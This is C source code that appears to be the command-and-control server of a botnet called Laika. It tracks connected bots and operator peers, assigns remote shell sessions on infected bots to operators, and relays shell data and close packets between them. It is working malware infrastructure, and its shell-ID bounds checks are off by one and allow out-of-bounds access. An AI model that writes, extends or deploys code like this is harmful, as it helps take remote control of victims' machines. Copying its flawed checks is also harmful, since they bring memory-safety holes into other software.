#include "lmem.h"

#include "cnc.h"
#include "cpeer.h"

/* ===============================================[[ Peer Info ]]================================================ */

struct sLaika_peerInfo *allocBasePeerInfo(struct sLaika_cnc *cnc, size_t sz) {
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)laikaM_malloc(sz);
    
    pInfo->cnc = cnc;
    pInfo->lastPing = laikaT_getTime();
    pInfo->completeHandshake = false;
    return pInfo;
}

struct sLaika_botInfo *laikaC_newBotInfo(struct sLaika_cnc *cnc) {
    struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)allocBasePeerInfo(cnc, sizeof(struct sLaika_botInfo));
    int i;

    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
        bInfo->shellAuths[i] = NULL;
    }

    return bInfo;
}

struct sLaika_authInfo *laikaC_newAuthInfo(struct sLaika_cnc *cnc) {
    struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)allocBasePeerInfo(cnc, sizeof(struct sLaika_authInfo));

    aInfo->shellBot = NULL;
    return aInfo;
}

void laikaC_freePeerInfo(struct sLaika_peer *peer, struct sLaika_peerInfo *pInfo) {
    peer->uData = NULL;
    laikaM_free(pInfo);
}

/*int laikaC_findAuthShell(struct sLaika_botInfo *bot, uint32_t id) {
    struct sLaika_peer *auth;
    struct sLaika_authInfo *aInfo;
    int i;

    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
        if ((auth = bot->shellAuths[i]) != NULL && (aInfo = auth->uData)->shellID == id)
             return i;
    }

    return -1;
}*/

int laikaC_addShell(struct sLaika_botInfo *bInfo, struct sLaika_peer *auth) {
    int i;

    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
        if (bInfo->shellAuths[i] == NULL) {
            bInfo->shellAuths[i] = auth;
            return i;
        }
    }

    return -1;
}

void laikaC_rmvShell(struct sLaika_botInfo *bInfo, struct sLaika_peer *auth) {
    int i;

    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
        if (bInfo->shellAuths[i] == auth) {
            bInfo->shellAuths[i] = NULL;
            return;
        }
    }
}

void laikaC_closeBotShells(struct sLaika_peer *bot) {
    struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)bot->uData;
    struct sLaika_peer *auth;
    int i;

    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
        if ((auth = bInfo->shellAuths[i]) != NULL) {
            /* forward to SHELL_CLOSE to auth */
            laikaS_emptyOutPacket(auth, LAIKAPKT_SHELL_CLOSE);

            /* close shell */
            ((struct sLaika_authInfo*)(auth->uData))->shellBot = NULL;
            bInfo->shellAuths[i] = NULL;
        }
    }
}

/* ============================================[[ Packet Handlers ]]============================================= */

void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)uData;
    struct sLaika_cnc *cnc = bInfo->info.cnc;
    struct sLaika_peer *auth;
    uint32_t id;

    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));

    /* ignore packet if shell isn't open */
    if (id > LAIKA_MAX_SHELLS || (auth = bInfo->shellAuths[id]) == NULL)
        return;

    /* forward SHELL_CLOSE to auth */
    laikaS_emptyOutPacket(auth, LAIKAPKT_SHELL_CLOSE);

    /* close shell */
    ((struct sLaika_authInfo*)(auth->uData))->shellBot = NULL;
    bInfo->shellAuths[id] = NULL;
}

void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    char buf[LAIKA_SHELL_DATA_MAX_LENGTH];
    struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)uData;
    struct sLaika_peer *auth;
    uint32_t id;

    /* ignore packet if malformed */
    if (sz < 1 || sz > LAIKA_SHELL_DATA_MAX_LENGTH+sizeof(uint32_t))
        return;

    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));

    /* ignore packet if shell isn't open */
    if (id > LAIKA_MAX_SHELLS || (auth = bInfo->shellAuths[id]) == NULL)
        return;

    laikaS_read(&peer->sock, (void*)buf, sz-sizeof(uint32_t));

    /* forward SHELL_DATA packet to auth */
    laikaS_startVarPacket(auth, LAIKAPKT_SHELL_DATA);
    laikaS_write(&auth->sock, buf, sz-sizeof(uint32_t));
    laikaS_endVarPacket(auth);
}
